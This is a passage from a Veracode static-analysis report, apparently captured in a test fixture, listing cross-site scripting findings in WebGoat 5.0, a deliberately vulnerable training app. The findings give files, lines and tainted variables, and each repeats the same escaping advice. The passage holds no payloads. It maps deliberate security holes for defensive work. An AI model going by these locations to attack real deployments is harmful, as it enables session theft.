        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"85\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable menu.
        The tainted data originated from an earlier call to javax.servlet.servletrequest.getparameter.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"main_jsp.java\" line=\"178\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.main_jsp\" functionprototype=\"void
        _jspService(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse)\"
        functionrelativelocation=\"59\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"124\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable menu.
        The tainted data originated from an earlier call to javax.servlet.servletrequest.getparameter.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"main_jsp.java\" line=\"180\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.main_jsp\" functionprototype=\"void
        _jspService(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse)\"
        functionrelativelocation=\"60\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"101\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable webSession.getRestartLink().
        The tainted data originated from an earlier call to javax.servlet.servletrequest.getparameter.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"main_jsp.java\" line=\"194\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.main_jsp\" functionprototype=\"void
        _jspService(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse)\"
        functionrelativelocation=\"64\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"90\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.println\" description=\"This call to javax.servlet.jsp.JspWriter.println()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to println() contains tainted data from the variable printParameters.
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameternames,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"main_jsp.java\" line=\"212\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.main_jsp\" functionprototype=\"void
        _jspService(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse)\"
        functionrelativelocation=\"73\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"16\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.println\" description=\"This call to javax.servlet.jsp.JspWriter.println()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to println() contains tainted data from the variable printCookies.
        The tainted data originated from an earlier call to javax.servlet.http.httpservletrequest.getcookies.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"main_jsp.java\" line=\"223\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.main_jsp\" functionprototype=\"void
        _jspService(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse)\"
        functionrelativelocation=\"79\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"269\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable webSession.getMessage().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.http.httpservletrequest.getcookies, and javax.servlet.http.httpservletrequest.getheader.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"main_jsp.java\" line=\"231\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.main_jsp\" functionprototype=\"void
        _jspService(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse)\"
        functionrelativelocation=\"84\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"103\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable searchedName.
        The tainted data originated from an earlier call to javax.servlet.servletrequest.getparameter.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"SearchStaff_jsp.java\" line=\"52\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.SearchStaff_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"48\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"187\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable searchedName.
        The tainted data originated from an earlier call to javax.servlet.servletrequest.getparameter.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"SearchStaff_jsp.java\" line=\"52\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.SearchStaff_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"48\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"193\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable searchedName.
        The tainted data originated from an earlier call to javax.servlet.servletrequest.getparameter.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"SearchStaff_jsp.java\" line=\"52\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.SearchStaff_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"48\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"121\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.io.PrintWriter.print\" description=\"This call to java.io.PrintWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable result.
        The tainted data originated from an earlier call to javax.servlet.servletrequest.getparametervalues.
        The tainted data is directed into an output stream returned by javax.servlet.servletresponse.getoutputstream.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"SilentTransactions.java\" line=\"94\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.SilentTransactions\" functionprototype=\"void
        handleRequest(session.WebSession)\" functionrelativelocation=\"52\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"23\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable webSession.getUserNameInLesson().
        The tainted data originated from an earlier call to java.sql.statement.executequery.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.jsp\" line=\"9\" sourcefilepath=\"/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"16\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"35\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable webSession.getUserNameInLesson().
        The tainted data originated from an earlier call to java.sql.statement.executequery.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.jsp\" line=\"9\" sourcefilepath=\"/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"16\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"256\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
